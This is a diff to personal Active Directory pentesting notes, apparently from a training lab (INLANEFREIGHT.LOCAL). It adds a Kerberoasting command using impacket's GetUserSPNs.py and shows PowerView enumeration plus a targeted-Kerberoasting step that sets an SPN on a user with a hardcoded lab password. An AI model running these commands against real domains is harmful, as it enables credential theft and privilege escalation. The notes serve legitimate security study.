@@ -22,6 +22,9 @@ Related:
 [HaveIBeenPwned](https://haveibeenpwned.com/)
 - Public Websites 
 - Google Dorking
+## Password Spraying 
+**Linux** 
+**Windows**
 ## Internal Enumeration 
 
 ```
@@ -59,7 +62,6 @@ Get-Domain
 Get-DomainController # returns list of domain controllers for specific domain 
 Get-ADDomainController # returns domain controller ip address, needed for GetUserSPN.py 
 ```
-
 
 ```
 Get DomainUser #Will return all users or specific user objects in AD 
@@ -145,11 +147,14 @@ Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
 
 Find Computers where Domain Users are Local Admin
 
-## Privilege Escalation 
 ## Exploitation (from Linux)
+> [!NOTE]  
+> Requires domain user, cleartext password or hash, a shell in context of user or a shell in context of system. Must also know which host is domain controller so we can query it 
+**Kerberoasting**
+```sudo python3 -m pip install . ```
+```GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev```
 ## Exploitation (from Windows )
 
-### Lateral Movement 
 
 **Kerberoasting** 
 ```
@@ -180,4 +185,5 @@ token::elevate
 $SecPassword = ConvertTo-SecureString 'DBAilfreight1!' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\mssqladm', $SecPassword)
 Set-DomainObject -credential $Cred -Identity ttimmons -SET @{serviceprincipalname='acmetesting/LEGIT'} -Verbose
-
+```
+# ACL
